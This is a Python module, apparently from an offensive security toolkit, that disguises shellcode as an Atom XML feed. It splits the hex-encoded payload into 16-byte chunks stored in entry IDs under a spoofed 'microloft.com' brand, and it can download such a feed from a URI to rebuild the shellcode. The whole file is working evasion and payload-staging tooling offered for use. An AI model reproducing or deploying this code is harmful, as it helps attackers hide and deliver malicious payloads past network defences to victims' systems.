########################################################
### feed Module
### Status: cleaned, 083
### 
########################################################

import datetime
import feedparser
from lxml import etree
from utils.helper import nstate as nstate
from utils.helper import GetFileInfo, CheckFile

CATEGORY    = 'obfuscate'
DESCRIPTION = 'Obfuscate shellcodes as XML Feed'

def register_arguments(parser):
    parser.add_argument('-i', '--input', help='Input file for feed encoding')
    parser.add_argument('-o', '--output', help='Output file for feed encoding')

    grp = parser.add_argument_group('additional')
    grp.add_argument('-r', '--reassemble', action='store_true', help='Reassemble fake feed to Shellcode')
    grp.add_argument('-u', '--uri', help='URI to fake feed')

class module:
    Author = 'psycore8'
    Version = '2.1.4'
    DisplayName = 'FEED-OBF'
    hash = ''
    data_size = 0

    feed_fake_uri = 'https://www.microloft.com/'
    feed_fake_title = 'Developer News'
    feed_fake_subtitle = 'The latest developer news from microloft.com'
    feed_fake_author = 'Bill Ports'
    feed_fake_ids = []
    shellcode = ''
    relay_input = False
    relay_output = False

    def __init__(self, input, output, uri, reassemble):
        self.input_file = input
        self.output_file = output
        self.uri = uri
        self.reassemble = reassemble

    def msg(self, message_type, ErrorExit=False):
        messages = {
            'pre.head'       : f'{nstate.FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'error.input'    : f'{nstate.s_fail} File {self.input_file} not found or cannot be opened.',
            'error.output'   : f'{nstate.s_fail} File {self.output_file} not found or cannot be opened.',
            'post.done'      : f'{nstate.s_ok} DONE!',
            'proc.input_ok'  : f'{nstate.s_ok} File {self.input_file} loaded\n{nstate.s_ok} Size of shellcode {self.data_size} bytes\n{nstate.s_ok} Hash: {self.hash}',
            'proc.output_ok' : f'{nstate.s_ok} File {self.output_file} created\n{nstate.s_ok} Size {self.data_size} bytes\n{nstate.s_ok} Hash: {self.hash}',
            'proc.input_try' : f'{nstate.s_note} Try to open file {self.input_file}',
            'proc.try'       : f'{nstate.s_note} Try to generate fake feed',
            'proc.retry'     : f'{nstate.s_note} Try to reassemble shellcode'
        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def open_file(self):
        if self.relay_input:
            self.shellcode = self.input_file
        else:
            try:
                for b in open(self.input_file, 'rb').read():
                    self.shellcode += b.to_bytes(1, 'big').hex()
                return True
            except FileNotFoundError:
                return False

    def convert_bytes_to_fake_id(self, block_size=16):
        s = self.shellcode.encode('utf-8')
        self.feed_fake_ids.extend([s[i:i + block_size] for i in range(0, len(s), block_size)])

    def generate_feed(self):
        date_time = datetime.datetime.now()
        root = etree.Element('feed')

        # Header
        feed_link = etree.SubElement(root, 'link', attrib=
                                  {
                                      'href': f'{self.feed_fake_uri}feed.xml',
                                      'rel': 'self',
                                      'type': 'application/atom+xml'
                                      })
        feed_updated = etree.SubElement(root, 'updated')
        feed_updated.text = f'{date_time}'
        feed_id = etree.SubElement(root, 'id')
        feed_id.text = f'{self.feed_fake_uri}feed.xml'
        feed_title = etree.SubElement(root, 'title', attrib={'type': 'html'})
        feed_title.text = f'{self.feed_fake_title}'
        feed_subtitle = etree.SubElement(root, 'subtitle')
        feed_subtitle.text = f'{self.feed_fake_subtitle}'
        feed_author = etree.SubElement(root, 'author')
        feed_author_name = etree.SubElement(feed_author, 'name')
        feed_author_name.text = f'{self.feed_fake_author}'

        # Entries
        i = 1
        for id in self.feed_fake_ids:
            entry = etree.SubElement(root, 'entry')
            entry_title = etree.SubElement(entry, 'title', attrib={'type': 'html'})
            entry_title.text = f'Title {i}'
            entry_link = etree.SubElement(entry, 'link', attrib={'href': f'{self.feed_fake_uri}0{i}/02/title{i}', 'rel': 'alternate', 'type': 'text/html', 'title': 'Title 1'})
            entry_published = etree.SubElement(entry, 'published')
            entry_published.text = f'{date_time}'
            entry_updated = etree.SubElement(entry, 'updated')
            entry_updated.text = f'{date_time}'
            entry_id = etree.SubElement(entry, 'id')
            entry_id.text = f'{self.feed_fake_uri}{id.decode('utf-8')}' # 16 bytes part of shellcode
            i += 1

        xml_str = etree.tostring(root, pretty_print=True, xml_declaration=True, encoding="utf-8")
        return xml_str

    def reassemble_shellcode(self):
        feed = feedparser.parse(self.uri)
        for entry in feed.entries:
            pos = entry.id.rfind('/')
            self.shellcode += entry.id[pos + 1:]
        return bytes.fromhex(self.shellcode)

    def output_result(self):
        if self.relay_output:
            return self.shellcode
        else:
            with open(self.output_file, 'wb') as f:
                f.write(self.shellcode)

    def process(self):
        self.msg('pre.head')
        if self.reassemble:
            self.msg('proc.retry')
            self.shellcode = self.reassemble_shellcode()
            self.output_result()
        else:
            self.msg('proc.input_try')
            if CheckFile(self.input_file):
                self.data_size, self.hash = GetFileInfo(self.input_file)
                self.open_file()
                self.msg('proc.input_ok')
                self.convert_bytes_to_fake_id()
                self.msg('proc.try')
                self.shellcode = self.generate_feed()
                self.output_result()
            else:
                self.msg('error.input', True)
        if not self.relay_output:
            if CheckFile(self.output_file):
                self.data_size, self.hash = GetFileInfo(self.output_file)
                self.msg('proc.output_ok')
            else:
                self.msg('error.output', True)
        self.msg('post.done')




